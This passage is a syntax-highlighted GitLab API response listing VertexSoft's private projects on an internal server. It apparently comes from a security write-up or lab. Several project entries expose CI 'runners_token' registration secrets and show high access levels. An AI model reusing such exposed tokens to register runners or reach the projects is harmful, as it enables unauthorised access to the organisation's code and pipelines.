     <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:00.306Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:40\" dir=\"auto\">VertexSoft Internal Employee Service App&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:00.622Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941nmFUY2NxrQoLyDNnGYPx"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft's old ERP system"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ERP_Old"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / ERP_Old"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.051Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.004Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:00:07.041Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:27\" dir=\"auto\">VertexSoft's old ERP system&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:07.428Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941iNU3bBzdNg5pzdrmapMJ"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"PortalCode"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / PortalCode"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T15:53:27.257Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode/-/blob/main/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:30:40.441Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token 